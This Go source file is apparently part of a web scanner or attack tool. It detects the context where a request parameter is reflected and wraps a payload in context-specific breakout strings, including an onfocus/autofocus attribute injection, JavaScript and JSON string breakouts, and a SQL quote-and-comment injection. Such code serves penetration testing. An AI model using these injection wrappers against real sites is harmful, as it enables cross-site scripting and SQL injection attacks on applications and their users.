package payload

import (
	"strings"
)

func DetectContext(body string, paramName string) string {
	if body == "" || paramName == "" {
		return "html"
	}

	idx := strings.Index(strings.ToLower(body), strings.ToLower(paramName))
	if idx == -1 {
		return "html"
	}

	before := body[:idx]

	if strings.LastIndex(before, "</script>") < strings.LastIndex(before, "<script") {
		return "js"
	}

	lastTagClose := strings.LastIndex(before, ">")
	lastQuote := strings.LastIndex(before, "\"")
	lastSingleQuote := strings.LastIndex(before, "'")

	if lastQuote > lastTagClose || lastSingleQuote > lastTagClose {
		return "attr"
	}

	jsonBraceCount := strings.Count(before, "{") - strings.Count(before, "}")
	if jsonBraceCount > 0 && strings.Contains(before, "\"") {
		return "json"
	}

	if strings.Contains(strings.ToLower(body), "<?xml") {
		return "xml"
	}

	return "html"
}

func InjectInContext(ctx string, payload string) string {
	switch ctx {
	case "html":
		return payload
	case "attr":
		return "\" onfocus=\"" + payload + "\" autofocus=\""
	case "js":
		return "';" + payload + "//"
	case "json":
		return "\",\"" + payload + "\":\""
	case "xml":
		return "<!-->" + payload + "<!--"
	case "sql":
		return "'" + payload + "--"
	default:
		return payload
	}
}
